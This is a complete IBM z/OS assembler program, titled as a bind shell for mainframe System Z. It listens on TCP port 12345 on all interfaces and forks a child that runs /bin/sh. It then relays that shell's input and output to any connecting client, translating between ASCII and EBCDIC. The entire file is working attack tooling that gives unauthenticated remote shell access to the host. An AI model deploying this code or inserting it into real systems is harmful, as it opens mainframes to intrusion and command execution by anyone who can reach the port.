         TITLE  'bind shell for  mainframe/system Z'
BINDSH   CSECT  
BINDSH   AMODE 31
BINDSH   RMODE ANY
***********************************************************************
*                                                                     *
*        @SETUP registers and save areas                              *
*                                                                     *
***********************************************************************
@SETUP   DS    0F              # full word boundary
         STM   14,12,12(13)    # save our registers
         LARL  15,@SETUP       # base address into R15
         LR    8,15            # copy R15 to R8
         USING @SETUP,8        # R8 for addressability throughout
         LARL  11,SAVEAREA     # sa address
         ST    13,4(,11)       # save callers save area
         LR    13,11           # R13 to our save area
         DS    0H              # halfword boundaries

***********************************************************************
*                                                                     *
*        @LOADFS - load all the functions we need                     *
*          for SC loop this                                           *
*                                                                     *
***********************************************************************
@LOADFS  L     2,FFUNC         # first function we use
         LHI   3,8             # used for our index
         L     4,NUMFUNC       # number of functions to load
@LDLOOP  LR    0,2             # load string of func name
         XR    1,1             # clear R1
         SVC   8               # perform LOAD
         XC    0(8,2),0(2)     # clear current Func space
         ST    0,0(0,2)        # store addr in func space
         AR    2,3             # increment R2 by 8
         AHI   4,-1            # decrement R4
         CIB   4,0,2,@LDLOOP   # compare R4 with 0,if GT loop

***********************************************************************
*                                                                     *
*        BPX1SOC set up socket - inline                               *
*                                                                     *
***********************************************************************
LSOCK    L     15,BSOC         # load func addr to 15
         CALL  (15),(DOM,TYPE,PROTO,DIM,SRVFD,                         x
               RTN_VAL,RTN_COD,RSN_COD),VL
*******************************
*  chk return code, 0 or exit *
*******************************
         LHI   15,2
         L     6,RTN_VAL
         CIB   6,0,7,EXITP     # R6 not 0? Time to exit

***********************************************************************
*                                                                     *
*        BPC1BND (bind) bind to socket  - inline                      *
*                                                                     *
***********************************************************************
LBIND    L     15,BBND                      # load func addr to 15
         LA    5,SRVSKT                     # addr of our socket
         USING SOCKADDR,5                   # layout sockaddr over R5
         XC    SOCKADDR(16),SOCKADDR        # zero sock addr struct
         MVI   SOCK_FAMILY,AF_INET          # family inet
         MVI   SOCK_LEN,SOCK#LEN            # len of socket
         MVC   SOCK_SIN_PORT,LISTSOCK       # list on PORT 12345
         MVC   SOCK_SIN_ADDR,LISTADDR       # listen on 0.0.0.0
         DROP  5
         CALL  (15),(SRVFD,SOCKLEN,SRVSKT,                             x
               RTN_VAL,RTN_COD,RSN_COD),VL
*******************************
*  chk return code, 0 or exit *
*******************************
         LHI   15,3
         L     6,RTN_VAL
         CIB   6,0,7,EXITP     # R6 not 0? Time to exit

***********************************************************************
*                                                                     *
*        BPX1LSN (listen) listen on created socket - inline           *
*                                                                     *
***********************************************************************
LLIST    L     15,BLSN          # load func addr to 15
         CALL  (15),(SRVFD,BACKLOG,                                    x
               RTN_VAL,RTN_COD,RSN_COD),VL
*******************************
*  chk return code, 0 or exit *
*******************************
         LHI   15,4
         L     6,RTN_VAL
         CIB   6,0,7,EXITP     # R6 not 0? Time to exit

***********************************************************************
*                                                                     *
*        BPX1ACP (accept) - accept conn from socket - inline          *
*                                                                     *
***********************************************************************
LACPT    L     15,BACP         # load func addr to 15
         LA    5,CLISKT        # addr of our socket address
         USING SOCKADDR,5      # set up addressing for sock struct
         XC    SOCKADDR(8),SOCKADDR        #zero sock addr struct
         MVI   SOCK_FAMILY,AF_INET
         MVI   SOCK_LEN,(SOCK#LEN+SOCK_SIN#LEN)
         DROP  5
         CALL  (15),(SRVFD,CLILEN,CLISKT,                              x
               CLIFD,RTN_COD,RSN_COD),VL
****************************************************
*  chk return code here anything but -1 is ok      *
****************************************************
         LHI   15,5
         L     6,CLIFD   
         CIB   6,-1,8,EXITP     # R6 = -1? Time to exit

***********************************************************************
*                                                                     *
*        Create pipes to be used to communicate with child proc       *
*          that will be created in upcoming forking                   *
*                                                                     *
***********************************************************************
@CPIPES  BRAS  14,LPIPE        # get FDs for child proc
@CFD     ST    5,CFDR          # store child read fd
         ST    6,CFDW          # store child write fd
@CPIPE2  BRAS  14,LPIPE
@PFD     ST    5,PFDR          # store parent read fd
         ST    6,PFDW          # store parent write fd

***********************************************************************
*                                                                     *
*        BP1FRK  (FORK) fork a child process                          *
*                                                                     *
***********************************************************************
LFORK    L     15,BFRK         # load func addr to 15
         CALL  (15),(CPROCN,RTN_COD,RSN_COD),VL
         BRAS  0,@PREPCHL
****************************************************
*  chk return code here anything but -1 is ok      *
****************************************************
         LHI   15,1            # load 1 for RC / Debugging
         L     6,CPROCN        # locad Ret val in R6
         CIB   6,-1,8,EXITP    # compare R6 to -1 and jump if eq

****************************************************
*  prepare the child process for exec , only runs  *
*  if CPROCN (child pid from fork) equals 0        *
****************************************************
@PREPCHL L     2,CPROCN        # load child proc # to R2
         CIB   2,0,7,@PREPPAR  # R2 not 0? We are parent, move on

*************************************************
* order of things to prep child pid             *
*  0) Close parent write fd                     *
*  1) Close child read fd                       *
*  2) dupe parent read fd to std input          *
*  3) dupe child write fd to std output         *
*  4) dupe child write fd to std err            *
*  5) Close parent read fd                      *
*  6) Close child write fd                      *
*  7) exec /bin/sh                              *
*************************************************
         LA    2,F_CLOSFD
         L     5,PFDW          # load R5 with pfdw
         L     6,PFDW          # load R5 with pfdw
@PRC0    BRAS  14,LFCNTL       # call close
         LA    2,F_CLOSFD
         L     5,CFDR          # load R5 with cfdr
         L     6,CFDR          # load R5 with cfdr
         BRAS  14,LFCNTL       # call close
         LA    2,F_DUPFD2      # gonna do a dup2
         L     5,PFDR          # parent read fd
         LGFI  6,0             # std input  
         BRAS  14,LFCNTL       # call dupe2
         LA    2,F_DUPFD2      # gonna do a dup2
         L     5,CFDW          # child write fd 
         LGFI  6,1             # std output
         BRAS  14,LFCNTL       # call dupe2
         LA    2,F_DUPFD2      # gonna do a dup2
         L     5,CFDW          # child write fd 
         LGFI  6,2             # std error
         BRAS  14,LFCNTL       # call dupe2
         LA    2,F_CLOSFD
         L     5,PFDR          # load R5 with pfdr
         L     6,PFDR          # load R5 with pfdr
         BRAS  14,LFCNTL       # call close
         LA    2,F_CLOSFD
         L     5,CFDW          # load R5 with cfdw
         L     6,CFDW          # load R5 with cfdw
         BRAS  14,LFCNTL       # call close

***********************************************************************
*                                                                     *
*        BP1EXC  (EXEC) execute shell '/bin/sh'                       *
*                                                                     *
***********************************************************************
LEXEC    L     15,BEXC         # load func addr to 15
         CALL  (15),(EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,               x
               EXENVC,EXENVLL,EXENVL,                                  x
               EXITRA,EXITPLA,                                         x
               RTN_VAL,RTN_COD,RSN_COD),VL
         BRAS  0,GOODEX        # exit child proc after exec

****************************************************
*  prepare the parent process to speak with child  *
*  order of things to prep parent pid              *
*  0)  close parent fd read                        *
*  1)  close child fd write                        *
*  2)  socket,bind,accept,listen,read & write      * 
*  3)  set client socked and child fd write        *
*       to non_blocking                            *
****************************************************
@PREPPAR LA    2,F_CLOSFD
         L     5,PFDR          # load R5 with pfdr
         L     6,PFDR          # load R5 with pfdr
         BRAS  14,LFCNTL       # call close
         LA    2,F_CLOSFD
         L     5,CFDW          # load R5 with cfdw
         L     6,CFDW          # load R5 with cfdw
         BRAS  14,LFCNTL       # call close

****************************************************
*  Set clifd and child fd read to non_blocking     *
****************************************************
         LA    2,F_GETFL       # get file status flags
         L     5,CLIFD         # client sock fd
         XR    6,6             # for getfd, arg is 0
         BRAS  14,LFCNTL       # call dupe2
         LA    5,O_NONBLOCK    # add non-blocking flag 
         OR    7,5             # or to add the flag to R7
         LA    2,F_SETFL       # set file status flags
         L     5,CLIFD         # client sock fd
         LR    6,7             # put new flags in R6
         BRAS  14,LFCNTL       # call dupe2
         LA    2,F_GETFL       # get file status flags
         L     5,CFDR          # child fd read
         XR    6,6             # for getfd, arg is 0
         BRAS  14,LFCNTL       # call dupe2
         LA    5,O_NONBLOCK    # add non-blocking flag 
         OR    7,5             # or to add the flag to R7
         LA    2,F_SETFL       # set file status flags
         L     5,CFDR          # child fd read
         LR    6,7             # put new flags in R6
         BRAS  14,LFCNTL       # call dupe2
***********************************************************************
*                                                                     *
*        Main read from client socket looop starts here               *
*                                                                     *
***********************************************************************
@READCLI L     5,CLIFD         # read from CLIFD
         LA    7,@READCFD      # Nothing read, return to here
         BRAS  14,LREAD        # Brach to read function

*******************************
*    CALL A2E                 *
*     change CLIBUF from      *
*     ASCII to EBCDIC         *
*******************************
         BRAS  14,CONVAE       # call e2a func
         L     5,PFDW          # write to child process fd
         BRAS  14,LWRITE       # call write function

***********************************************************************
*                                                                     *
*        Read from child fd loop starts here                          *
*                                                                     *
***********************************************************************
@READCFD L     5,CFDR          # read from child fd
         LA    7,@READCLI      # nothing read, back to socket read
         BRAS  14,LREAD        # Branch to read function

*******************************
*    CALL E2A                 *
*     change CLIBUF from      *
*     ebcdic to ASCII        *
*******************************
         BRAS  14,CONVEA       # call e2a func
         L     5,CLIFD         # write to client socked fd
         BRAS  14,LWRITE       # call write function

********************************************************
*    Functions beyond this point, no more inline       *
*      execution beyond here should occur              *
********************************************************
***********************************************************************
*                                                                     *
*        BPX1RED (read) - function                                    *
*          R5  has file descriptor to read from                       *
*          R7  has nothing read address                               *
*          R14 has good read return address                           *
*                                                                     *
***********************************************************************
LREAD    L     15,BRED         # load func addr to 15
         ST    5,@TRFD         # file descriptor we are reading
         ST    7,@NRA          # no bytes read: return address
         ST    14,SAVEAREA     # bytes read: return address
         XR    1,1             # clear R1
         ST    1,BREAD         # clear Bytes Read
         L     5,CLIBUF        # clibuf addr
         XC    0(52,5),0(5)    # 0 out cli buf
         BRAS  0,@CRED         # jump to call
         DS    0F
@TRFD    DC    4XL1'0'         # temp var for rd to read
@NRA     DC    4XL1'0'         # temp var for not read ret addr
@CRED    CALL  (15),(@TRFD,CLIBUF,ALET,CLIREAD,                        x
               BREAD,RTN_COD,RSN_COD),VL
         DS    0H
****************************************************
*  chk return code here anything but -1 is ok      *
*   for non-blocking fd's we have to check         *
*   both the return val and code to make sure      *
*   it didn't fail just b/c non-blocking and no    *
*   data available vs just a read error            *
****************************************************
         L     14,SAVEAREA     # bytes read RA
         L     7,@NRA          # no bytes read RA
         LHI   15,6            # exit code for this function
         L     6,BREAD         # bytes read (aka rtn val) 
         CIB   6,0,2,0(14)     # bytes read, process them
         CIB   6,0,8,0(7)      # OK rtn code, on to nobyte read
         L     6,RTN_COD       # load up return code
         LA    1,EWOULDBLOCK   # load up the non-blocking RTNCOD
         LA    2,EAGAIN        # load up the other OK nblck RTNCOD
         CRB   6,1,8,0(7)      # OK rtn code, on to nobyte read 
         CRB   6,2,8,0(7)      # OK rtn code, on to nobyte read 
         BRAS  0,EXITP         # -1 and not due to blocking, exit

***********************************************************************
*                                                                     *
*        BPX1WRT (WRITE) - function                                   *
*            R5 has file descriptor to read from                      *
*                                                                     *
***********************************************************************
LWRITE   L     15,BWRT          # load func addr to 15
         ST    5,@TWFD          # store fd in temp fd
         ST    14,SAVEAREA      # save return address
         BRAS  0,@CWRT          # jump to write
@TWFD    DC    A(*)             # temp holder for fd
@CWRT    CALL  (15),(@TWFD,CLIBUF,ALET,BREAD,                          x
               BWRIT,RTN_COD,RSN_COD),VL
**************************************************************
*  chk return code here anything but neg 1 is ok             *
*  exit if a match  (8)                                      *
**************************************************************
         L     14,SAVEAREA      # restore return address
         LHI   15,9             # exit code for this func
         L     6,BWRIT          # set r6 to rtn val
         CIB   6,-1,8,EXITP     # exit if R6 = -1
         BCR   15,14            # back to return address         

***********************************************************************
*                                                                     *
*        BPX1FCT (fcntl) edit file descriptor                         *
*           for dup2  set  R2=F_DUPFD2                                *
*           R5=fd to modify R6=fd to set R5 equal to                  *
*           equivalent to dupe2(R5,R6)                                *
*           for read flags, set R2=F_GETFL                            *
*           R5=fd, R6=0, R7=rtn flags                                 *
*           for write flags, set R2=F_SETFL                           *
*           R5=fd, R6=<new flags>  R7=0                               *
*           for  close, set R2=F_CLOSFD                               *
*           R5=R6 = fd to close (optionally R5 & R6 can be a range    *
*           of FDs to close)                                          *
*                                                                     *
***********************************************************************
LFCNTL   L     15,BFCT         # load func addr to 15
         ST    14,SAVEAREA     # save return address
         ST    5,@FFD          # fd to be duplicated
         ST    2,@ACT          # action field for BPX1FCT
         ST    6,@ARG          # r6 should have the biggest fd
         BRAS  0,@FCTL
@FFD     DC    F'0'
@ACT     DC    F'0'
@ARG     DC    F'0'
@RETFD   DC    F'0'
@FCTL    CALL  (15),(@FFD,@ACT,@ARG,@RETFD,RTN_COD,RSN_COD),VL
****************************************************
*  chk return code here anything but -1 is ok      *
****************************************************
         LHI   15,11           # exit code for this func
         L     7,@RETFD        # set r6 to rtn val
         CIB   7,-1,8,EXITP    # r6 = -1 exit
         L     14,SAVEAREA     # reload ret address
         BCR   15,14           # return to caller

***********************************************************************
*                                                                     *
*        BPX1PIP (pipe)  create pipe - no input                       *
*          returns: R5=read fd  R6=write fd                           *
*                                                                     *
***********************************************************************
LPIPE    L     15,BPIP         # load func addr to 15
         ST    14,SAVEAREA     # save return address
         BRAS  0,@PIP
@RFD     DC    F'0'            # read file desc
@WFD     DC    F'0'            # write file desc
@PIP     CALL  (15),(@RFD,@WFD,RTN_VAL,RTN_COD,RSN_COD),VL
****************************************************
*  chk return code here anything but -1 is ok      *
****************************************************
         LHI   15,12           # exit code for this func
         L     6,BWRIT         # set r6 to rtn val
         CIB   6,-1,8,EXITP
         L     5,@RFD          # load R5 with read fd
         L     6,@WFD          # load R6 with write fd
         L     14,SAVEAREA     # reload ret address
         BCR   15,14           # return to caller

***********************************************************************
*                                                                     *
*        CONVAE -  convert CLIBUF ascii to ebcdic                    *
*            function looks up ascii byte and returns ebcdic          *
*            expects return address in R14                            *
*                                                                     *
***********************************************************************
CONVAE   LHI   6,1        # R6 has number 1
         L     4,BREAD    # num of bytes read 
         L     1,CLIBUF   # address of cli sock input
LOOP1    L     2,A2E      # address of a2e buff 
         SR    2,6        # subtract 1 from R2 addr
         LB    3,0(0,1)   # Load byte from cli into R3
         NILF  3,X'FF'    # make sure R3 is 1 positive byte
         AR    2,3        # add ascii val to a2e buff
         LB    3,0(0,2)   # load byte from a2e buff into R3
         NILF  3,X'FF'    # make sure R3 is 1 positive byte
         STC   3,0(0,1)   # store R3 byte back into cli buff
         AR    1,6        # increment client buff
         SR    4,6        # sub1 from ctr, loop if non-neg
         BRC   7,LOOP1    # looop 
         BCR   15,14      # return to caller

***********************************************************************
*                                                                     *
*        CONVEA -  convert CLIBUF ebcdic to ascii                    *
*            function looks up ebcdic byte and returns ascii         *
*            expects return address in R14                            *
*                                                                     *
***********************************************************************
CONVEA   LHI   6,1        # R6 has number 1
         L     4,BREAD    # num of bytes read 
         L     1,CLIBUF   # address of cli sock input
LOOP2    L     2,E2A      # address of e2a buff 
         SR    2,6        # subtract 1 from R2 addr
         LB    3,0(0,1)   # Load byte from cli into R3
         NILF  3,X'FF'    # make sure R3 is 1 positive byte
         AR    2,3        # add ascii val to e2a buff
         LB    3,0(0,2)   # load byte from e2a buff into R3
         STC   3,0(0,1)   # store R3 byte back into cli buff
         NILF  3,X'FF'    # make sure R3 is 1 positive byte
         AR    1,6        # increment client buff
         SR    4,6        # sub1 from ctr, loop if non-neg
         BRC   7,LOOP2    # looop 
         BCR   15,14      # return to caller
         
****************************************************
* cleanup & exit                                   *
* preload R15 with exit code                       *
****************************************************
GOODEX   XR    15,15           # zero return code
EXITP    ST    15,0(,11)
         L     13,4(,11)
         LM    14,12,12(13)    # restore registers
         LARL  5,SAVEAREA
         L     15,0(0,5)
         BCR   15,14           # branch to caller

**********************
**********************
*                    *
* Constant Sections  *
*                    *
**********************
**********************
@CONST   DS    0F              # constants full word boundary 
SAVEAREA DC    X'00000000'
         DC    X'00000000'
ALET     DC    F'0'
O_NONBLOCK   EQU  X'04'         # bit for nonblocking io
EWOULDBLOCK  EQU  X'44E'        # rtncod for nonblk read sock
EAGAIN       EQU  X'70'         # rtncod for nonblk, not thr
*************************
* Function addresses    *       # pipe variables
*************************
FFUNC    DC    A(BFRK)          # address of first function
NUMFUNC  DC    F'11'            # number of funcs listed below
BFRK     DC    CL8'BPX1FRK '    # Fork
BEXC     DC    CL8'BPX1EXC '    # Exec
BSOC     DC    CL8'BPX1SOC '    # Socket
BBND     DC    CL8'BPX1BND '    # Bind
BLSN     DC    CL8'BPX1LSN '    # Listen
BACP     DC    CL8'BPX1ACP '    # Accept
BRED     DC    CL8'BPX1RED '    # Read
BWRT     DC    CL8'BPX1WRT '    # Write
BCLO     DC    CL8'BPX1CLO '    # Close
BFCT     DC    CL8'BPX1FCT '    # Fcntl
BPIP     DC    CL8'BPX1PIP '    # Pipe
*************************
* Socket conn variables *       # functions used by pgm
*************************
LISTSOCK DC    XL2'3039'        # port 12345
LISTADDR DC    XL4'00000000'    # address 0.0.0.0
BACKLOG  DC    F'1'             # 1 byte backlog
DOM      DC    A(AF_INET)         # AF_INET = 2
TYPE     DC    A(SOCK#_STREAM)    # stream = 1
PROTO    DC    A(IPPROTO_IP)      # ip = 0
DIM      DC    A(SOCK#DIM_SOCKET) # dim_sock = 1
SRVFD    DC    A(*)               # server FD
SRVSKT   DC    16XL1'77'          # srv socket struct
SOCKLEN  DC    A(SOCK#LEN+SOCK_SIN#LEN)
CLILEN   DC    A(*)               # len of client struct
CLISKT   DC    16XL1'88'          # client socket struct
CLIFD    DC    A(*)               # client fd
************************
* BPX1PIP vars *********          # pipe variables
************************
CFDR     DC    F'0'               # child proc FD read
CFDW     DC    F'0'               # child proc FD write
PFDR     DC    F'0'               # parent proc FD read
PFDW     DC    F'0'               # parent proc FD write
************************
* BPX1FRK vars *********
************************
CPROCN   DC    F'-1'              # child proc #
************************
* BPX1EXC vars *********
************************
EXCMD    DC    CL7'/bin/sh'       # command to exec
EXCMDL   DC    A(L'EXCMD)         # len of cmd to exec
EXARGC   DC    F'1'               # num of arguments
EXARG1   DC    CL2'sh'            # arg 1 to exec
EXARG1L  DC    A(L'EXARG1)        # len of arg1
EXARGL   DC    A(EXARG1)          # addr of argument list
EXARGLL  DC    A(EXARG1L)         # addr of arg len list
EXENVC   DC    F'0'               # env var count
EXENVL   DC    F'0'               # env var arg list addr
EXENVLL  DC    F'0'               # env var arg len addr
EXITRA   DC    F'0'               # exit routine addr
EXITPLA  DC    F'0'               # exit rout parm list addr
**************************
* Socket read/write vars *
**************************
CLIREAD  DC    F'52'              # one less than buf
CLIBUF   DC    A(@CBUF)           # buff for read cli sock
@CBUF    DC    XL52'22'           # buffer for bytes read
BREAD    DC    F'0'               # bytes read
BWRIT    DC    F'0'               # bytes written
*********************
* Return value vars *
*********************
RTN_VAL  DC    A(*)               # return value
RTN_COD  DC    A(*)               # return code
RSN_COD  DC    A(*)               # reason code
***************************
***** end of constants ****
***************************
****************************************************
* ebcdic to ascii lookup                          *
* read hex(ebcdic char) bytes from beginning of   *
* array to get ascii byte                          *
****************************************************
E2ABUF   DC    X'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX
               1c1d1e1f808182838485171b88898a8b8c0506079091169394959604X
               98999a9b14159e1a20a0e2e4e0e1e3e5e7f1a22e3c282b7c26e9eaebX
               e8edeeefecdf21242a293b5e2d2fc2c4c0c1c3c5c7d1a62c255f3e3fX
               f8c9cacbc8cdcecfcc603a2340273d22'
         DC    X'd8616263646566676869abbbf0fdfeb1b06a6b6c6d6e6f707172aaX
               bae6b8c6a4b57e737475767778797aa1bfd05bdeaeaca3a5b7a9a7b6X
               bcbdbedda8af5db4d77b414243444546474849adf4f6f2f3f57d4a4bX
               4c4d4e4f505152b9fbfcf9faff5cf7535455565758595ab2d4d6d2d3X
               d530313233343536373839b3dbdcd9da'
         DC    X'9f'
E2A      DC    A(E2ABUF)
****************************************************
* ascii to ebcdic lookup                          *
* read hex(ascii char) bytes from beginning of     * 
* array to get ebcdic byte                        *
****************************************************
A2EBUF   DC    X'010203372d2e2f1605150b0c0d0e0f101112133c3d322618193f27X
               1c1d1e1f405a7f7b5b6c507d4d5d5c4e6b604b61f0f1f2f3f4f5f6f7X
               f8f97a5e4c7e6e6f7cc1c2c3c4c5c6c7c8c9d1d2d3d4d5d6d7d8d9e2X
               e3e4e5e6e7e8e9ade0bd5f6d79818283848586878889919293949596X
               979899a2a3a4a5a6a7a8a9c04fd0a107'
         DC    X'202122232425061728292a2b2c090a1b30311a333435360838393aX
               3b04143eff41aa4ab19fb26ab5bbb49a8ab0caafbc908feafabea0b6X
               b39dda9b8bb7b8b9ab6465626663679e687471727378757677ac69edX
               eeebefecbf80fdfefbfcbaae594445424643479c4854515253585556X
               578c49cdcecbcfcce170dddedbdc8d8e'
         DC    X'df'
A2E      DC    A(A2EBUF)
         BPXYSOCK   LIST=YES         # MACRO MAP for socket structure
         BPXYFCTL   LIST=YES         # MACRO MAP for fcntl structure
         END   @SETUP
